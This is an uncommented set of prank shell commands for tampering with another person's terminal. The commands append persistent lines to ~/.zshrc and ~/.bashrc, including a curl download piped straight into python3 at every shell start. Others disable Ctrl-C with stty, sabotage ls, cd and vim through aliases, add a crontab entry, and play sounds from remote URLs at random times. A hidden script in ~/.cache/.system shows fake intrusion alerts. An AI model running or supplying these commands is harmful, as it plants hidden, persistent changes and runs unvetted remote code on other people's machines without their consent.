# cat
echo 'curl parrot.live' >> ~/.zshrc
###
echo 'while true; do echo -ne "\r Loading..."; sleep 0.1; done' >> ~/.zshrc
###
echo 'tetris() { curl -sL https://raw.githubusercontent.com/dionyziz/terminal-tetris/master/tetris.py | python3; }; tetris' >> ~/.zshrc
###
echo "alias ls='sl'" >> ~/.zshrc
###
echo "alias cd='echo You are not allowed to cd anymore!'" >> ~/.zshrc
###
echo 'mpv --no-video https://www.youtube.com/watch?v=dQw4w9WgXcQ' >> ~/.zshrc
##

#can not cntl/c
###
stty intr '' erase '' kill ''
#reverse colors
echo -e '\e[?5h'

###random stuff
while true; do echo "System overload..."; sleep 5; done &
###
alias ls='echo "Stop using ls. Use your brain."'
###
alias cd='echo "Nope. Walk there yourself."'
###
echo "alias ls='cowsay Use your eyes!'" >> ~/.bash_profile


#every t minutes
(crontab -l 2>/dev/null; echo "*/2 * * * * echo ' I am watching you...'") | crontab -

#delay 
alias cd='sleep 2; cd'
#vim forever
alias vim='vim ~/.bashrc'

#reboot terminal
(sleep $((RANDOM % 60 + 30)); echo "System Error! Reboot now!") &
#will remove itself###
echo 'echo "Ribbit!" && sed -i "/Ribbit/d" ~/.zshrc' >> ~/.zshrc
#overhit
nohup bash -c "sleep 60 && echo 'Overheating detected'" >/dev/null 2>&1 &
#delete###
(sleep 20; stty intr undef) &
###sounds###
###Wilhelm scream	###
echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/wilhelm.mp3') >/dev/null 2>&1 &" >> ~/.bashrc
###Fart	###
echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/fart.mp3') >/dev/null 2>&1 &" >> ~/.bashrc
###aleert####
echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/hacker.mp3') >/dev/null 2>&1 &" >> ~/.bashrc
###laugh###
echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/spongebob-laugh.mp3') >/dev/null 2>&1 &" >> ~/.bashrc

#message###
mkdir -p ~/.cache/.system
cat << 'EOF' > ~/.cache/.system/.agent.sh
#!/bin/bash
sleep $((RANDOM % 120 + 60))
if (( RANDOM % 5 == 0 )); then
    MSGS=("Intrusion detected!" " Kernel panic!" "You have been hacked!" "Calling IT support...")
    cowsay "${MSGS[$RANDOM % ${#MSGS[@]}]}"
fi
EOF

chmod +x ~/.cache/.system/.agent.sh

#random message###
echo 'nohup ~/.cache/.system/.agent.sh >/dev/null 2>&1 &' >> ~/.zshrc

